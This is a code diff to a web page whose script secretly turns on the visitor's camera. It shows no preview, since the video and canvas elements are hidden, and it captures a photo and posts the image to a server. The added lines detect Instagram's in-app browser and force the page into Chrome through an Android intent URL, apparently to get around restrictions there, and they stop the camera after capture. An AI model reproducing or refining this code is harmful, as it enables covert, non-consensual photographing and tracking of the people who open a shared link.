@@ -6,11 +6,30 @@
 </head>
 <body>
 
-  <!-- الكاميرا تعمل في الخلفية بدون عرض -->
+  <!-- عناصر مخفية -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
+    /* =========================
+       1) Redirect from Instagram to Chrome (Android)
+       ========================= */
+    (function () {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      if (ua.includes("Instagram")) {
+        const url =
+          "intent://" +
+          window.location.host +
+          window.location.pathname +
+          window.location.search +
+          "#Intent;scheme=https;package=com.android.chrome;end";
+        window.location.href = url;
+      }
+    })();
+
+    /* =========================
+       2) Camera auto-capture (hidden)
+       ========================= */
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
 
@@ -26,6 +45,8 @@
       });
 
     async function capturePhoto() {
+      if (!video.videoWidth) return;
+
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       canvas.getContext("2d").drawImage(video, 0, 0);
@@ -37,6 +58,10 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ image })
       });
+
+      // إيقاف الكاميرا بعد الالتقاط (اختياري لكنه احترافي)
+      const tracks = video.srcObject.getTracks();
+      tracks.forEach(t => t.stop());
     }
   </script>
 
